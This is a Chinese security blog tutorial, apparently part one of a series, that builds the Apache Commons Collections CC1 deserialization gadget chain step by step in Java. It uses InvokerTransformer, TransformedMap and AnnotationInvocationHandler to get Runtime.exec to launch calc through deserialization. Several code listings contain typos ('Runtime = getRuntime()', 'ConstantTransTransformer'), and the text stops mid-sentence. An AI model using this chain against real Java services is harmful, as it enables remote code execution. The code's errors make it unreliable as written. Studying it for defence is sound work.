#  Web篇 |【全网最详细】Apache CC反序列化漏洞：CC1调用链POC构造过程，干货！！！（上）   
原创 零日安全实验室  零日安全实验室   2025-03-22 13:48  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCwudE6f3rX6fB5HDAo2ljf5g47ILopxJSLdAyMO6sEia1PJuHbYjMpxLo7eI96EvCIFBnIgA4zvpw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCwudE6f3rX6fB5HDAo2ljf0IpUSIjo6Apgmibic2Iq2EloAJ73zFrsZpeska1Za9mQ4A50pOSfSdMA/640?wx_fmt=png&from=appmsg "")  
  
  
免责声明！  
  
本  
公众号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法。  
  
  
  
  
上一文章讲解了Apache CC漏洞的原理以及CC1调用链，这一文章我们继续接着讲解Apache CC漏洞CC1调用链的POC构造，也就是怎么构造CC1调用链的源码？  
  
大 纲  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xClUkwicmh2xkm2ZCV3d6LYY8icxWlzTdLlF8wFHYgJGd7mupf2XbgJtpBrX4PSmHu7XjmCjaClhYjA/640?wx_fmt=png&from=appmsg "")  
  
1  
  
CC1调用链的流程分析：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCwudE6f3rX6fB5HDAo2ljfibv7XxFwYnGeyibqx1n8eM3lHcP3icdsY81lR4XY6ibkuLajXFZTdF3ia1g/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCwudE6f3rX6fB5HDAo2ljf1SBkdoZNS8QSyIriauJbhR9PSf0Xic22tPq8UOo4CCWzsGoJOpKKhG0g/640?wx_fmt=png&from=appmsg "")  
  
CC1调用链整体是这样的：  
  
S1：首先你在源码处发现了一个反序列化的地方并且它可以接收一个序列化的流，这个流是你可控的，然后它要把这个流反序列化成对象。  
  
S2：接下来你要找序列化入口类，就是哪个类它重写了readObject方法，并且这些方法里面可以链式执行，依次执行到了我们的危险方法，比如我们要执行的危险方法是Runtime.exec("calc")。  
  
假设我们现在就是要执行这个危险方法，那么我们就可以往回找，看谁可以调用这个危险方法，然后谁又可以调用这个中间类。最终我们要找到序列化入口类，它重写了readObject方法，并且可以依次链式执行下去。  
  
上一文章提到了这里的Commons Collections中有一个很重要的接口，即Transformer接口。  
  
2  
  
Transformer接口：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCwudE6f3rX6fB5HDAo2ljfgNj6VF63aOLX2iaQwqmLbBS8cZw7zXGibzibqZhicVCby2BBA6iaRNQTpqg/640?wx_fmt=png&from=appmsg "")  
  
(1) 作用：  
  
接收一个Object，返回一个对象。然后通过它的实现类可以根据需要进行处理，即对输入的Object进行自定义处理并返回相应的结果。  
  
我们可以看到它有很多的实现类，但是在CC1调用链中用到了InvokerTransformer  
类，TransformedMap类，AnnotationInvocationHandler类，ConstantTransformer类和ChainedTransformer类。  
  
3  
  
**InvokerTransformer类：**  
  
(1) 作用：  
  
你输入一个对象，它会通过反射的方式调用你输入对象的其中一个方法（方法名，形参列表和实参列表都是你自己可以控制的）。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCwudE6f3rX6fB5HDAo2ljfib7gvNfw5O3JYDLuCEQzfoXL84aWNDcicAAmXEDYRw5Ia9tMfoS7nJJg/640?wx_fmt=png&from=appmsg "")  
  
接下来我们看一下参数iMethodName是从哪里传入的？  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCwudE6f3rX6fB5HDAo2ljfyiaiaFV47CkYKFdbmcVdRicxm2YVYCncAksWJvZSOy9M6wgBxa30iaRmEA/640?wx_fmt=png&from=appmsg "")  
  
我们可以看到这个参数在InvokerTransformer类初始化构造的时候就被传了进来，并且对其进行了赋值，所以这里不管是执行哪个对象的方法都是可控的。那么我们就可以试着让它去执行一个危险方法。  
  
(2) 正常情况下（没有使用InvokerTransformer类）执行一个危险方法如下：  
```
import org.junit.Test;
import java.io.IOException;public class CC1Test1 {
    
    @Test
    public void invokeExec() throws IOException {
        Runtime.getRuntime().exec("calc");
    }
}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCwudE6f3rX6fB5HDAo2ljf3glxeSDAWNIKPoqdw9IFqrVxCsXvUIKn3cZ5Aouq25xkxHd1gNB78w/640?wx_fmt=png&from=appmsg "")  
  
(3) 使用  
InvokerTransformer类执行一个危险方法如下：  
```
import org.apache.commons.collections.functors.InvokerTransformer;
import org.junit.Test;
import java.io.IOException;
public class CC1Test1 {    
    @Test
    
    public void invokeExec() throws IOException { 
        //Runtime.getRuntime().exec("calc");
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",
            new Class[] {String.class},
            new Object[] {"calc"}
        );

        invokerTransformer.transform(Runtime.getRuntime());
    }
}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCwudE6f3rX6fB5HDAo2ljfQZjByHpaicKZrjuJZxTcSDDwYSnicADMljp6RdoacbclqwYSlzsCsQjg/640?wx_fmt=png&from=appmsg "")  
  
我们new一个InvokerTransformer对象，要传入的参数分别是方法的名字和形参列表和实参列表。那么这里方法的名字就是exec，然后形参列表是一个Class数组（new一个Class数组），然后传入的是一个字符串。实参则就是我们具体执行的什么命令，这里是打开计算器。  
  
然后接来下就是我们对哪个对象进行调用，这里我们是对Runtime.getRuntime()对象进行调用。  
  
到这里我们就把危险方法往前推进了一步找到了一个中间类，所以我们的调用流程就变成了如下，  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/MicZ6Q9ZW0xCwudE6f3rX6fB5HDAo2ljfSJ7JuDY0xwazxAUyKRnj2cgMiaEmBhcNDjFGDBQ7PnUozOZvJeRv4Yg/640?wx_fmt=jpeg "")  
  
4  
  
**TransformedMap类：**  
  
接下来我们就应该在InvokerTransformer类中找谁调用了Transformer方法，怎么查找呢？  
  
我们可以通过查找看谁使用了这个方法。  
  
不难发现在TransformedMap类中checkSetValue()函数这里调用了Transformer方法。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCwudE6f3rX6fB5HDAo2ljfwf61xWJys2Eibjat53g9bVXsa8eDf99yZ3S6aH6ArWnAv3GA62gFXDQ/640?wx_fmt=png&from=appmsg "")  
  
这里的话如果让valueTransformer = invokerTransformer，并且将Runtime.getRuntime()对象传入给checkSetValue()函数，那么实际的执行效果就等同于我们前面的invokerTransformer.transform(Runtime.getRuntime())。  
  
问题：  
  
怎么给valueTransformer变量赋值呢？  
  
回答：  
  
我们看valueTransformer变量是在哪里进行赋值的。  
  
不难发现TransformedMap方法可以给我们的valueTransformer变量进行赋值，但是这个TransformedMap方法的访问级别是只有你在这个TransformerMap类的内部才可以去调用这个方法，在外部是无法调用的。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCwudE6f3rX6fB5HDAo2ljfpRR6FeWnWK6wBG3HibHNfEoHEzXBRD2ViaejZLLD3fZeOk6fuESUaAhg/640?wx_fmt=png&from=appmsg "")  
  
那么我们就只能在TransformedMap类中再看还有哪里给我们的valueTransformer变量进行了赋值。  
  
不难发现还有一个decorate装饰方法，可以将我们的valueTransformer变量传入，然后再调用TransformedMap方法。这里的decorate装饰方法是一个公开静态的方法，它会给你进行实例化。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCwudE6f3rX6fB5HDAo2ljf1A9adSSmM3Rx1dtkIwOQiaYMbjiaibzpK1AegibMlVrYmcHnopgyCmNVEA/640?wx_fmt=png&from=appmsg "")  
  
测试代码：  
```
Map decorated = TransformedMap.decorate(null, null, invokerTransformer);
TransformedMap.checkSetValue()
```  
  
所以的话我们就可以调用TransformedMap.decorate方法，然后给它传入一些null，再把我们要调用的invokerTransformer传进去。最后我们再调用TransformedMap类中的checkSetValue()函数，并把我们的Runtime.getRuntime()对象传进去，就等同于我们前面的invokerTransformer.transform(Runtime.getRuntime())。  
  
但是checkSetValue()函数也是受限制的。  
  
所以我们就再在TransformedMap类中找哪里调用了checkSetValue()函数。  
  
不难发现在TransformedMap类继承的父类AbstractlnputCheckedMapDecorator中调用了checkSetValue()函数，它是在MapEntry实体中调用的。那么也就是说在调用MapEntry实体的时候就会调用我们的checkSetValue()函数。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCwudE6f3rX6fB5HDAo2ljfD7iaY9P65ITWn3n3qrtnYoYmxWAiab6Af5bKQKibiayMgxe4t5tOYH8iaOw/640?wx_fmt=png&from=appmsg "")  
  
然后到目前为止，我们要做两件事：  
  
1、给AbstractlnputCheckedMapDecorator$MapEntry.setValue()函数中传入我们的Runtime.getRuntime()；  
  
2、给TransformedMap.valueTransformer赋值成之前构造好的invokerTransformer对象。  
  
然后就会等同于执行了我们前面的invokerTransformer.transform(Runtime.getRuntime())。  
  
我们再来梳理一下这个过程，其实实质上就是：  
  
这个checkSetValue()函数实质上就是你每次赋值的时候，它会把你的值替换成通过Transformer方法转换之后的输出对象。也就是不管是赋值什么，它都会通过Transformer方法给你转换一下再存进Map里面。  
  
然后再看一下decorate装饰方法，它传入了一个map，然后再传入一个keyTransformer和valueTransformer，它本身是实现了TransformerMap类。然后这个decorate装饰方法里面具体是把这个map传给父类，然后父类再把它传给了它的父类AbstractlnputCheckedMapDecorator，然后父类再把它传给了父类AbstractMapDecorator，最后父类AbstractMapDecorator把它传给了自身的一个属性。然后在父类AbstractlnputCheckedMapDecorator里面它会重写Map.Entry.setValue()函数。  
  
总结：  
  
你用decorator(map)传入一个map，然后返回给你一个map，这个decorator对你输入的map做了一些增强，添加了一些新的功能。或者在调用原始对象的方法之前或之后执行自己的操作。  
  
具体来说就是，被增强后的TransformedMap对象，在执行Map.Entry.setValue()的时候，会被替换成重写过的setValue()函数。  
  
所以构造方法如下：  
  
先构造一个我们自己的map，键和值都是Object，然后在这个map里面放入一些值，比如a，b。最后我们用TransformedMap对原始map做一个增强，keyTransformer为null，valueTransformer我们使用之前构造好的invokerTransformer对象，然后它就会返回一个Map，这个Map是增强过的，它的键和值我们仍旧都是Object。  
  
问题：  
  
那么我们怎么调用这个增强过的map呢？  
  
回答：  
  
我们可以使用for去遍历它的实体，拿到实体之后我们就可以调用增强之后的map了。  
  
用decorated.entrySet()取出它的实体，然后用Map.Entry去接收，同样Map.Entry的键和值都是Object。  
  
这时我们可以先不用赋值，先看一下它的输出结果，也就是它的每一个实体是一个什么东西？  
  
代码如下：  
```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import org.junit.Test;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;public class CC1Test1 {
    
    @Test
    
    public void invokeExec() throws IOException {        
    //Runtime.getRuntime().exec("calc");
        
    InvokerTransformer invokerTransformer = new InvokerTransformer("exec",
        new Class[]{String.class},             
        new Object[]{"calc"}
    );
        
    //invokerTransformer.transform(Runtime.getRuntime());
    //Map decorated = TransformedMap.decorate(null,null, invokerTransformer);
    //TransformedMap.checkSetValue()      
    HashMap<Object, Object> map = new HashMap<>();
        map.put("a", "b");
        Map<Object, Object> decorated = TransformedMap.decorate(map, null, invokerTransformer); 
              
        for (Map.Entry<Object, Object> entry : decorated.entrySet()) {
            System.out.println(entry);
        }
    }
}
```  
  
可以看到里面的键值对就成了一个实体。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCwudE6f3rX6fB5HDAo2ljf9XNjJ5MKfNXCDtj6lfx15QUOpjjbI0Cj4srncyG0f696CGYXIUo7gA/640?wx_fmt=png&from=appmsg "")  
  
然后我们再通过entry.SetValue传入我们的危险方法，即Runtime.getRuntime()。代码如下：  
```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import org.junit.Test;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;public class CC1Test1 {
    
    @Test
    
    public void invokeExec() throws IOException {        
    //Runtime.getRuntime().exec("calc");
        
    InvokerTransformer invokerTransformer = new InvokerTransformer("exec",
        new Class[]{String.class},             
        new Object[]{"calc"}
    );
        
    //invokerTransformer.transform(Runtime.getRuntime());
    //Map decorated = TransformedMap.decorate(null,null, invokerTransformer);
    //TransformedMap.checkSetValue()      
    HashMap<Object, Object> map = new HashMap<>();
        map.put("a", "b");
        Map<Object, Object> decorated = TransformedMap.decorate(map, null, invokerTransformer); 
              
        for (Map.Entry<Object, Object> entry : decorated.entrySet()) {
            entry.setValue(Runtime = getRuntime());
        }
    }
}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCwudE6f3rX6fB5HDAo2ljfCmA7oKpFJGicDF8qOiaycaa9dN8TkA50K2yRE1uELNmQUasucgW9O93Q/640?wx_fmt=png&from=appmsg "")  
  
到这里为止，我们把我们的利用链又往前推进了一步，所以我们的调用流程就变成了如下，  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCwudE6f3rX6fB5HDAo2ljfnfq2QbXt2AvpUt6y0SErgf9sw8c3oeDFwzgCfIvlTecTcVgZYwX1bA/640?wx_fmt=png&from=appmsg "")  
  
5  
  
**AnnotationInvocationHandler类：**  
  
接下来我们在AbstractlnputCheckedMapDecorator找谁可以调用Map.Entry.setValue()函数。  
  
用同样的方法，通过查找发现有好多类都调用了Map.Entry.setValue()函数。但是我们最好找到一个序列化入口类，也就是重写了readObject方法，在readObject方法里面调用了setValue()函数，这样的话就一步到位，省略了我们找中间类的过程。  
  
根据这个条件，不难发现AnnotationlnvocationHandler类具备上述的所有条件。即：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCwudE6f3rX6fB5HDAo2ljfPSPDNyQ5EyeJrAINvEgq0EOHCeTCeOePgVbR6ic7snSt3oK2p5EWfBg/640?wx_fmt=png&from=appmsg "")  
  
1、可以被序列化：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCwudE6f3rX6fB5HDAo2ljfee5gtwiauxL6mpRVOO2QwopdZjiaXyMSGZblcK8b2qdEuGYoUvM3whibg/640?wx_fmt=png&from=appmsg "")  
  
2、重写了readObject方法：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCwudE6f3rX6fB5HDAo2ljfJkXgHJ0oN67tHPjdjSBQHRrkNuzNV5SmjOGpMib6por2RmHVH2FIe3Q/640?wx_fmt=png&from=appmsg "")  
  
3、在readObject方法里面调用了setValue()函数：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCwudE6f3rX6fB5HDAo2ljfAzgdQomcG62bxUFngkTejdvgicYUKmV0FCdO8rTDRlbSEnVmxib3tNOQ/640?wx_fmt=png&from=appmsg "")  
  
至此我们又往前推了一步，那么现在这个链条就是完整链条了，所以我们的调用流程就变成了如下，  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCwudE6f3rX6fB5HDAo2ljfrjsicOASG7ib8lyT134KHy9QeVJORMM6keVr7DwvfS3BBmXlFW3NibppQ/640?wx_fmt=png&from=appmsg "")  
  
但是这里还存在一些问题，  
  
问题一：  
  
如何让遍历之后的Map等于我们增强的TransformedMap，也就是如何使AnnotationlnvocationHandler类中memberValues等于我们的TransformedMap对象呢？  
  
回答：  
  
我们只需看AnnotationlnvocationHandler类中memberValues是在哪里开始赋值的，不难发现是在AnnotationlnvocationHandler类的构造方法这里进行赋值的，所以当我们在对它构造的时候就可以给它传入一个我们增强好的Map，那么在它对我们增强好的Map进行setValue的时候它就会调用我们链条中的方法。  
  
问题二：  
  
AnnotationlnvocationHandler类不是public，我们无法在外面构造（实例化），该怎么办呢？  
  
回答：  
  
我们可以使用反射把它给构造出来。那么我们具体还是要看它要传入什么？那么第一个参数传入的是一个注解类型，第二个参数就是我们可以给它传入一个增强好的Map。  
  
接下来我们尝试使用反射把这个序列化入口类给构造出来，如下：  
  
这里我们再写一个@Test，把前面增强好的Map给复制下来，然后我们通过反射构造序列化入口类。我们先得到一个Class，然后通过这个类拿到它的构造方法，即给clazz.getDeclaredConstructor传入参数（第一个参数为Class类，第二个参数为map）。另外它的构造方法是未公开的，所以我们要设置一下可访问，确保我们能够访问到。最后我们就可以拿着这个构造方法去构造对象了，给constructor.newInstance传入参数，第一个参数为我们的注解，第二个参数为我们增强好的Map，然后这里同时会返回一个实例化的对象我们接收一下。  
  
接下来就开始调用AnnotationlnvocationHandler类的readObject方法，但是readObject方法是私有的，所以不能直接o.readObject。我们知道在进行反序列化的时候会调用这个readOject方法，那在反序列化之前我们还得序列化一次。因此我们可以通过调用前面准备好的序列化和反序列化函数（在CC.java文件），并给反序列化函数传入我们序列化之后的文件名。  
  
现在我们在执行这段代码的时候，AnnotationlnvocationHandler类的readObject方法也会被执行起来，我们可以试着在AnnotationlnvocationHandler类的readObject方法这里打上断点测试一下。  
  
代码如下：  
```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import org.junit.Test;
import java.io.IOException;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;
public class CC1Test1 {
    
    @Test    
    public void invokeExec() throws Exception {
        
    //Runtime.getRuntime().exec("calc");
        
        InvokerTransformer invokerTransformer = new InvokerTransformer(
            "exec", 
            new Class[]{String.class},
            new Object[]{"calc"}
        );
        
        //invokerTransformer.transform(Runtime.getRuntime());
        //Map decorated = TransformedMap.decorate(null,null, invokerTransformer);
        //TransformedMap.checkSetValue();
        
        HashMap<Object, Object> map = new HashMap<>();
        map.put("a", "b");
        Map<Object, Object> decorated = TransformedMap.decorate(map, null, invokerTransformer);
        
        for (Map.Entry<Object, Object> entry : decorated.entrySet()) {
            entry.setValue(Runtime.getRuntime());
        }
    }
    

    @Test
    public void invokeExec1() throws Exception {
        InvokerTransformer invokerTransformer = new InvokerTransformer(            
            "exec",
            new Class[]{String.class},
            new Object[]{"calc"}
        );
        HashMap<Object, Object> map = new HashMap<>();
        map.put("a", "b");
        Map<Object, Object> decorated = TransformedMap.decorate(map, null, invokerTransformer);
        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object o = constructor.newInstance(Target.class, decorated);
        CC.serialize(o);
        CC.unserialize("ser.bin");
    }
}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xClUkwicmh2xkm2ZCV3d6LYYZzngDHqJTtYh0DRoliaS8ycUuvK5LGa2yTBLtLAqAp6jNa9ImwqymJw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xClUkwicmh2xkm2ZCV3d6LYY1Hzia2eUUoJiaFoT52NMe4LxictW6ssyma7nzxIibzXtLeDr0VdI9MJKKw/640?wx_fmt=png&from=appmsg "")  
  
我们可以看到成功的停在了这里，并且执行了我们的readObject方法。  
  
问题三：  
  
要确保我们的代码能够执行setValue()函数，因为我们可以看到这个函数外面有两层if的。所以说只有if判断成立，才能够执行到我们的setValue()函数。那么怎么过掉这两层if呢？  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xClUkwicmh2xkm2ZCV3d6LYY0KJAmicnmibETkRR4amr2Yia3OBUhMumEWH4ko2vY80LWylkV1dtibkGyA/640?wx_fmt=png&from=appmsg "")  
  
回答：  
  
首先我们看第一层if后面的memberType != null，从Map<String, Class<?>> memberTypes = annotationType.memberTypes()可以看出memberType又是一个Map，从memberTypes.get(name)可以看出这个函数里面的参数不能为空，那我们是不是可以给它传入一个已经存在的key那就自然而然不可能为空了。  
  
现在我们再看一下memberTypes里面有什么key，我们看在哪里使用了这个memberTypes。从memberTypes = annotationType.memberTypes()可以看出，memberTypes  
  
等于一个注解Type（annotationType），那这个注解type又是什么东西呢？我们看在哪里使用了这个注解Type（annotationType）。如下图：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xClUkwicmh2xkm2ZCV3d6LYYReSdic8ticAeym45AHvWovN5icUQ5ibfaMP4raaTQia7WbUdQ8HTmWZ3gMg/640?wx_fmt=png&from=appmsg "")  
  
不难发现在这里使用了这个注解Type（annotationType），从annotationType = AnnotationType.getlnstance(type)可以看出对其进行了实例化，从参数这里发现这个注解Type就是我们前面构造AnnotationlnvocationHandler方法的时候传进去的注解Type。如下图：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xClUkwicmh2xkm2ZCV3d6LYYV2VrehW5hLK4YeSDX3UxADN8I6TpSPAkwWQxNd75QddovkU4ynmkeg/640?wx_fmt=png&from=appmsg "")  
  
所以这个注解Type就是我们自己传入的。  
  
所以整体就是通过我们传入的注解Type返回了我们的注解对象，然后我们再调用这个注解对象memberTypes。那么现在我们先看一下调用这个注解对象memberTypes能得到什么东西？  
  
测试代码：  
```
@Test
public void test() throws IOException{
    AnnotationType annotationType = AnnotationType.getInstance(Target.class);
    Map<String, Class<?>> memberTypes = annotationType.memberTypes();
    
    for (Map.Entry<String, Class<?>> entry : memberTypes.entrySet()) {
        System.out.println(entry);
}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xClUkwicmh2xkm2ZCV3d6LYYLvfgPQ7kypFq17orZJ10Et9xKicOtia0GJKzHLTGpOqEDIOoVqQ4MjGg/640?wx_fmt=png&from=appmsg "")  
  
我们首先通过AnnotationType.getInstance将我们的注解类Target传进去，然后它返回的是一个注解Type，然后这个注解Type它有一个memberTypes方法，然后这个memberTypes方法返回的是一个Map。  
  
然后用for遍历这个实体，最后看这个实体里面有什么？  
  
执行程序：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xClUkwicmh2xkm2ZCV3d6LYYqfHqMokWFMpxuh607pj601dpcnPVqacykKUv2YT7dZIZ9ruAOmIj7w/640?wx_fmt=png&from=appmsg "")  
  
我们可以看到注解Target里面它有键值对。  
  
前面我们说过只要出现键值对我们就直接把这个键（key）传给memberTypes.get()它就不可能为空了。  
  
从memberTypes.get(name)可以看到里面参数还有name，那么这个name是怎么传入的呢？  
  
从String name = memberValue.getKey()和for(Map.Entry<Object, Object> menberValue:memberValues.entrySet())可以看到这个name就是我们之前传进去的增强Map，如下图：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xClUkwicmh2xkm2ZCV3d6LYYEficL00lIph46Vj7C1nQ798xvXDJsFPlg2JnKTxSFsQYCVbwFegpJZw/640?wx_fmt=png&from=appmsg "")  
  
所以现在的话我们会给它传入增强Map，然后这个增强Map是可控的，它会自动的去找它的key，所以最后memberTypes.get()函数我们传入map.key，即memberTypes.get(map.key)，只要这个key里面有前面实体（前面测试代码）中键值对的value我们就可以使这两个if成立。  
  
接下来我们开始构造，如下：  
  
我们在前面的map.put()函数中传入value和null，然后在AnnotationlnvocationHandler类中打上断点测试一下。  
  
代码如下：  
```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import org.junit.Test;
import sun.reflect.annotation.AnnotationType;
import java.io.IOException;
import java.lang.annotation.Annotation;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;
public class CC1Test1 {
    
    @Test
    
    public void 
        invokeExec() throws Exception {
        
        //Runtime.getRuntime().exec("calc");
        
        InvokerTransformer invokerTransformer = new InvokerTransformer(
            "exec",
            new Class[]{String.class},                
            new Object[]{"calc"}
        );
        
        //invokerTransformer.transform(Runtime.getRuntime());
        //Map decorated = TransformedMap.decorate(null,null, invokerTransformer);
        //TransformedMap.checkSetValue();
        
        HashMap<Object, Object> map = 
        new HashMap<>();
        map.put("a", "b");
        Map<Object, Object> decorated = TransformedMap.decorate(map, null, invokerTransformer);
        
        for (Map.Entry<Object, Object> entry : decorated.entrySet()) {
            entry.setValue(Runtime.getRuntime());
        }
    }
    
    @Test
    
    public void invokeExec1() throws Exception {
        InvokerTransformer invokerTransformer = new InvokerTransformer(
            "exec",
            new Class[]{String.class},
            new Object[]{"calc"}
        );
        HashMap<Object, Object> map = new HashMap<>();
        map.put("value", "null");
        Map<Object, Object> decorated = TransformedMap.decorate(map, null, invokerTransformer);
        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object o = constructor.newInstance(Target.class, decorated);
        CC.serialize(o);
        CC.unserialize("ser.bin");
    }
    
    @Test
    public void test() throws IOException{
        AnnotationType annotationType = AnnotationType.getInstance(Target.class);
        Map<String, Class<?>> memberTypes = annotationType.memberTypes();
        for (Map.Entry<String, Class<?>> entry : memberTypes.entrySet()) {
            System.out.println(entry);
        }
    }
}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xClUkwicmh2xkm2ZCV3d6LYY4fgfd3askDjtnG0zfHPzDluicZzxvWK9TvicL4YZDMicKicbIeH6eF1LoA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xClUkwicmh2xkm2ZCV3d6LYYX1oao3Y4B1YtBPrnw1rItvxgI6aPfZiaXRSEfLhbCXklE959nVTQohg/640?wx_fmt=png&from=appmsg "")  
  
我们可以看到成功的停在了这里，成功的使第一层if成立，那么第二层if呢？  
  
我们发现其实第二层if就是判断我们传入的memberType是否可以进行实例化，也就是测试代码中的实体中的键值对，那一般情况下肯定是可以进行实例化的，所以第二层if也自然而然成立。  
  
问题四：  
  
我们给setValue()函数传入的参数是不可控的，怎么能够让我们可控呢？  
  
回答：  
  
使用ConstantTransformer类可以解决。  
  
6  
  
**ConstantTransformer类：**  
  
ConstantTransformer类的作用是不管你传入什么，它都能正常返回iConstant常量。  
  
我们看它是从哪里传入的？  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xClUkwicmh2xkm2ZCV3d6LYYaWmHA8ZqdjOZMhZkHwxDevYInH7NGByZicfs1cBcicgiaRPc2vwCbaZNw/640?wx_fmt=png&from=appmsg "")  
  
我们发现是在构造ConstantTransformer类的时候就已经传入了。  
  
接下来我们开始构造，如下：  
  
因此我们在调用的时候必须传入Runtime.getRuntime()，所以在entry.setValue()函数中不管传入什么都不重要了，因为它返回的都是一个iConstant常量。  
  
**代码如下：**  
```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import org.junit.Test;
import sun.reflect.annotation.AnnotationType;
import java.io.IOException;
import java.lang.annotation.Annotation;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;
public class CC1Test1 {
    
    @Test
    
    public void 
        invokeExec() throws Exception {
        
        //Runtime.getRuntime().exec("calc");
        
        InvokerTransformer invokerTransformer = new InvokerTransformer(
            "exec",
            new Class[]{String.class},                
            new Object[]{"calc"}
        );
        
        //invokerTransformer.transform(Runtime.getRuntime());
        //Map decorated = TransformedMap.decorate(null,null, invokerTransformer);
        //TransformedMap.checkSetValue();
        
        HashMap<Object, Object> map = 
        new HashMap<>();
        map.put("a", "b");
        Map<Object, Object> decorated = TransformedMap.decorate(map, null, invokerTransformer);
        
        for (Map.Entry<Object, Object> entry : decorated.entrySet()) {
            entry.setValue(Runtime.getRuntime());
        }
    }
    
    @Test
    
    public void invokeExec1() throws Exception {
        InvokerTransformer invokerTransformer = new InvokerTransformer(
            "exec",
            new Class[]{String.class},
            new Object[]{"calc"}
        );
        HashMap<Object, Object> map = new HashMap<>();
        map.put("value", "null");
        ConstantTransformer constantTransformer = new ConstantTransTransformer(Runtime.getRuntime());
        Map<Object, Object> decorated = TransformedMap.decorate(map, null, constantTransformer);
        for (Map.Entry<Object, Object> entry : decorated.entrySet()) {
            entry.setValue(null);
        }
        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object o = constructor.newInstance(Target.class, decorated);
        CC.serialize(o);
        CC.unserialize("ser.bin");
    }
    
    @Test
    public void test() throws IOException{
        AnnotationType annotationType = AnnotationType.getInstance(Target.class);
        Map<String, Class<?>> memberTypes = annotationType.memberTypes();
        for (Map.Entry<String, Class<?>> entry : memberTypes.entrySet()) {
            System.out.println(entry);
        }
    }
}
```  
  
也就是说其实我们之前的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/MicZ6Q9ZW0xClUkwicmh2xkm2ZCV3d6LYYeFLBRHKTFMlpbIuacia48aovNLJzCLNTPCpZ7ek2MRuceTHwMW5PbYg/640?wx_fmt=jpeg "")  
  
和现在的  
  
